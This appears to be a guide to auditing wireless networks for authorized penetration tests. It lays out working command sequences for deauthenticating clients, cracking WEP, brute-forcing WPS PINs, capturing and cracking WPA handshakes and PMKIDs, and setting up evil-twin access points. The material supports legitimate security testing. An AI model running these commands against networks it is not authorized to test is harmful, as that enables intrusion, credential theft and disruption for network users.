# WiFi Security Assessment: Complete Methodology for Wireless Network Auditing

## Introduction

WiFi security assessments are critical for identifying vulnerabilities in wireless networks. This comprehensive guide provides a structured methodology for conducting professional wireless security audits, from initial planning through final reporting.

## Assessment Planning and Preparation

### Pre-Engagement Activities

#### 1. Scope Definition
```bash
# Define assessment boundaries
- Physical locations to be tested
- Wireless networks in scope
- Client devices included/excluded
- Time windows for testing
- Authorized personnel contacts
```

#### 2. Legal Documentation
```bash
# Required documentation
- Rules of Engagement (ROE)
- Non-Disclosure Agreement (NDA)  
- Statement of Work (SOW)
- Authorization letters
- Insurance verification
```

#### 3. Equipment Preparation
```bash
# Hardware checklist
□ Primary WiFi adapter (monitor mode capable)

```

### Information Gathering

#### 1. Public Information Research
```bash
# Organization intelligence
- Company WiFi naming conventions
- Social media posts revealing SSIDs
- Employee LinkedIn profiles
- Job postings mentioning WiFi equipment
- FCC database searches for approved equipment
```

#### 2. Physical Site Survey
```bash
# Site reconnaissance
- Building layout and access points
- Antenna locations and orientations
- Physical security measures
- Neighboring networks
- RF interference sources
```

## Assessment Methodology

### Phase 1: Reconnaissance and Discovery

#### 1.1 Passive Network Discovery
```bash
# Start monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Comprehensive network scan (30+ minutes recommended)
sudo airodump-ng wlan0mon -w initial_scan --write-interval 10

# Analyze discovered networks
grep -v "^$" initial_scan-01.csv | awk -F, '{print $14,$6,$9,$4}' | sort | uniq
```

#### 1.2 Active Network Enumeration
```bash
# Channel-specific scanning
for channel in 1 6 11; do
    sudo airodump-ng -c $channel wlan0mon -w channel_$channel --write-interval 5 &
    sleep 300
    sudo pkill airodump-ng
done

# 5GHz band scanning (channels 36, 44, 52, 60, 149, 157, 165)
for channel in 36 44 52 60 149 157 165; do
    sudo airodump-ng -c $channel --band a wlan0mon -w 5ghz_ch_$channel --write-interval 5 &
    sleep 180
    sudo pkill airodump-ng
done
```

#### 1.3 Hidden Network Detection
```bash
# Monitor for hidden SSIDs
sudo airodump-ng wlan0mon | grep "<length:"

# Probe for hidden networks
sudo aireplay-ng -0 3 -a [HIDDEN_AP_MAC] wlan0mon

# Use beacon frame analysis
tshark -i wlan0mon -f "wlan type mgt subtype beacon" -T fields -e wlan.bssid -e wlan.ssid
```

### Phase 2: Network Categorization and Prioritization

#### 2.1 Security Classification
```bash
# Create network inventory
# Format: SSID, BSSID, Channel, Encryption, Signal, Clients, Priority

# High Priority Targets:
- Open networks
- WEP encryption
- WPS enabled
- Default/weak naming conventions
- Strong signal strength

# Medium Priority:
- WPA/WPA2 with potential weak passwords
- Guest networks
- Legacy equipment

# Low Priority:
- WPA3 networks
- Enterprise authentication
- Weak signal/distant networks
```

#### 2.2 Client Device Analysis
```bash
# Monitor client activity
sudo airodump-ng -c [CHANNEL] --bssid [AP_MAC] wlan0mon

# Identify device types
# Look for:
- Manufacturer in MAC address
- Connection patterns
- Probe requests
- Data transmission volumes
```

### Phase 3: Vulnerability Assessment

#### 3.1 Open Network Testing
```bash
# Connect to open networks
sudo nmcli dev wifi connect "OpenNetwork"

# Network reconnaissance
nmap -sn $(route -n | grep wlan0 | head -1 | awk '{print $1}')
arp-scan --local --interface=wlan0

# Service enumeration
nmap -sS -O -sV -T4 [TARGET_IPS]

# Web application testing on captive portals
# Check for bypass techniques
# SSL/TLS configuration analysis
```

#### 3.2 WEP Network Assessment
```bash
# Target WEP networks
sudo airodump-ng -c [CHANNEL] --bssid [WEP_AP_MAC] -w wep_attack wlan0mon

# Generate traffic if needed
sudo aireplay-ng -1 0 -a [WEP_AP_MAC] wlan0mon
sudo aireplay-ng -3 -b [WEP_AP_MAC] wlan0mon

# Monitor packet collection
# Target: 20,000+ packets for reliable crack

# Attempt crack
sudo aircrack-ng wep_attack-01.cap
```

#### 3.3 WPS Vulnerability Testing
```bash
# Scan for WPS-enabled networks
wash -i wlan0mon

# Test WPS PIN vulnerability
sudo reaver -i wlan0mon -b [TARGET_MAC] -vv -d 60 -x 60

# Alternative tools
sudo bully -b [TARGET_MAC] -c [CHANNEL] wlan0mon

# Document results
- PIN found: [TIME_TO_CRACK]
- Lockout behavior observed
- Rate limiting effectiveness
```

#### 3.4 WPA/WPA2 Assessment
```bash
# Capture 4-way handshake
sudo airodump-ng -c [CHANNEL] --bssid [AP_MAC] -w handshake wlan0mon

# Trigger client reconnection
sudo aireplay-ng -0 5 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon

# Verify handshake capture
aircrack-ng handshake-01.cap

# PMKID attack attempt
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -z pmkid.hash pmkid.pcapng
```

#### 3.5 Dictionary and Brute Force Analysis
```bash
# Create target-specific wordlists
# Common patterns:
- CompanyName + years/numbers
- Location + common passwords
- Industry-specific terms
- Seasonal patterns

# Generate custom wordlists
crunch 8 15 -t [COMPANY_NAME]%%%% > custom.txt
cewl -w 6 -d 2 http://company-website.com > website_words.txt

# Hashcat GPU acceleration
hcxpcapngtool -o hash.hc22000 handshake.cap
hashcat -m 22000 hash.hc22000 custom_wordlist.txt --force

# Document time estimates
# Calculate crack time based on:
- Wordlist size
- GPU performance  
- Password complexity patterns
```

### Phase 4: Advanced Attack Techniques

#### 4.1 Evil Twin Attacks
```bash
# Create rogue access point
# hostapd.conf configuration
interface=wlan1
driver=nl80211
ssid=CompanyWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
wpa=2
wpa_passphrase=TemporaryPassword
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP

# Start rogue AP
sudo hostapd hostapd.conf &

# Monitor client connections
sudo dhcpd -cf dhcpd.conf -pf /var/run/dhcpd.pid wlan1

# Captive portal implementation
# (Advanced - implement with caution and proper authorization)
```

#### 4.2 Client-Side Attacks
```bash
# Karma attack simulation
# Create fake networks matching client probe requests

# WiFi Pineapple equivalent using Linux
# Monitor probe requests
sudo tshark -i wlan0mon -f "wlan type mgt subtype probe-req" -T fields -e wlan.ssid

# Create matching APs
# (Implement responsibly with proper authorization)
```

### Phase 5: Enterprise Network Testing

#### 5.1 802.1X Authentication Assessment
```bash
# Certificate analysis
openssl x509 -in radius_cert.pem -text -noout

# EAP method identification
- EAP-TLS: Certificate-based
- PEAP: Username/password with server cert
- EAP-TTLS: Flexible inner authentication

# Common misconfigurations:
- Weak certificate validation
- Default certificates
- Unencrypted inner authentication
```

#### 5.2 RADIUS Server Testing
```bash
# Network scanning for RADIUS
nmap -p 1812,1813 [NETWORK_RANGE]

# RADIUS protocol testing
# (Requires specialized tools and deep expertise)
```
